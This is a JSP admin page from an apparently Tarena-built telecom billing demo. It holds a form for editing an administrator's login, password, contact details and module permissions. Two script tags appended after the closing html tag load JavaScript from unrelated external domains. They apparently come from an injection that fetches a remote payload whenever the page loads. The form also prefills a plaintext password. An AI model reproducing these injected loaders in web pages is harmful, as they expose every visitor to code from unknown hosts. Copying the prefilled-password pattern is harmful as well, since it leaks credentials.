<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<html>
<head>
<title> 修改信息 </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center">

    <table width="91%" border="0" align="center">
      <tr bgcolor="#ccddee" class="pp">

      <td width="17%" height="6"><a href="addManager.htm" class="text_link"> 增加管理员</a></td>

      <td width="15%"> <a href="listManager.htm" class="text_link">管理员列表</a></td>

      <td width="17%"><span class="yellow"><a href="self.htm" class="text_link">
        私人信息</a></span></td>
      </tr>
    </table>

  <form name="adminForm" method="post" action="listManager.htm">
    <p class="pp"> 信息管理 </p>
    
    <table width="91%" border=1 bordercolor="ccccff" bgcolor="ccddee" class="9P">
      <tr>
        <td colspan="2"><div align="center"> </div></td>
      </tr>
      <input type="hidden" name="id" value="1">
      <input type="hidden" name="loginName" value="tarena">
      <tr>
        <td width="20%">登陆密码</td>
        <td width="80%"><input type="password" name="loginPassword" value="tarena"></td>
      </tr>
      <tr>
        <td>重复密码 </td>
        <td><input type="password" value="tarena" name="rePassword"/></td>
      </tr>
      <tr>
        <td>真实姓名</td>
        <td><input type="text" name="name" value="tarena"></td>
      </tr>
      <tr>
        <td>管理员邮箱 </td>
        <td><input type="text" name="email" value="tarena@tarena.com.cn"></td>
      </tr>
      <tr>
        <td>开通日期 </td>
        <td>Sun Oct 15 00:00:00 CST 2006</td>
      </tr>
      <tr>
        <td>联系电话 </td>
        <td><input type="text" name="phone" value="62132839"></td>
      </tr>
      <tr>
        <td>登陆权限 </td>
        <td><table>
          
            <tr>
              <td>
                  <input type="checkbox" name="modules" value="1" checked="checked"/>
              </td>
              <td>管理员管理</td>
            </tr>
          
            <tr>
              <td>
                  <input type="checkbox" name="modules" value="2" checked="checked"/>
              </td>
              <td>资费管理</td>
            </tr>
          
            <tr>
              <td>
                  <input type="checkbox" name="modules" value="3" checked="checked"/>
              </td>
              <td>用户管理</td>
            </tr>
          
            <tr>
              <td>
                  <input type="checkbox" name="modules" value="4" checked="checked"/>
              </td>
              <td>账务查询</td>
            </tr>
          
            <tr>
              <td>
                  <input type="checkbox" name="modules" value="5" checked="checked"/>
              </td>
              <td>账单查询</td>
            </tr>
          </table>
        </td>
      </tr>
      <tr>
        <td>&nbsp;</td>
        <td><div align="center">
            <input type="submit" name="Submit" value="修改">
            &nbsp;&nbsp;&nbsp;
            <input type="reset" name="reset" value="重设">
          </div></td>
      </tr>
    </table>
  </form>
</div>
<center>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000.
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>